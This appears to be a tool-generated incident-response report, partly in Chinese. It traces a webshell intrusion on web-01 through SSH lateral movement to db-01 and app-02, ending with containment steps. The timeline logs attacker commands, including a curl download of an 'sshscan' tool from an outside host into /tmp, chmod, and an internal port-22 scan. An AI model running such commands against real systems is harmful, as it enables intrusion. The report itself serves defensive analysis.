# Attack Chain Traceability Report

- **Scenario**: S1, S2, S3
- **Overall verdict**: confirmed_intrusion_chain
- **Confidence**: 0.88
- **Blocked**: False

攻击者 203.0.113.55 于 2026-06-22T09:07:55 命中 web-01；在 web-01 上发现 4 条执行/下载行为；横向至 db-01, app-02。

## Initial access

- **Victim host**: web-01
- **Time**: 2026-06-22T09:07:55+08:00
- **Vector**: webshell
- **URL**: /api/upload.php
- **Attacker IP**: 203.0.113.55
- **Evidence**: web-001

## Attack timeline

| Time | Stage | Host | Description | Evidence |
| --- | --- | --- | --- | --- |
| 2026-06-22T09:07:55+08:00 | initial_access | web-01 | 外网 203.0.113.55 访问 /api/upload.php（webshell） | web-001 |
| 2026-06-22T09:10:15+08:00 | execution | web-01 | 主机 web-01 执行命令: sh -c whoami | exec-001, file-001, file-002 |
| 2026-06-22T09:12:32+08:00 | execution | web-01 | web-01 监听进程子进程下载/执行: curl -o /tmp/sshscan http://198.51.100.5/tools/sshscan | exec-002, connect-001, file-001, file-002 |
| 2026-06-22T09:13:05+08:00 | execution | web-01 | 主机 web-01 执行命令: chmod +x /tmp/sshscan；主动外连 198.51.100.5:80 | exec-003, connect-001, file-001, file-002 |
| 2026-06-22T09:14:20+08:00 | execution | web-01 | 主机 web-01 执行命令: /tmp/sshscan -t 10.0.2.0/24 -p 22；主动外连 198.51.100.5:80 | exec-004, connect-001, file-001, file-002 |
| 2026-06-22T09:19:15+08:00 | lateral_movement | db-01 | SSH 登录成功: web-01(10.0.1.5) → db-01 用户 root | ssh-002, fw-001 |
| 2026-06-22T09:22:40+08:00 | lateral_movement | app-02 | SSH 登录成功: web-01(10.0.1.5) → app-02 用户 deploy | ssh-003, fw-002 |

## Impact scope

| Host | Role | Priority |
| --- | --- | --- |
| web-01 | initial_compromise | P0 |
| db-01 | lateral_target | P0 |
| app-02 | lateral_target | P0 |

## Recommended actions

- 立即隔离初始受害主机: web-01
- 排查并隔离横向目标（至少）: db-01, app-02
- 保全 WEB 与 SSH 相关日志，冻结当前时间窗证据
- 重置横向涉及主机上的可疑账号密码，检查 SSH 密钥
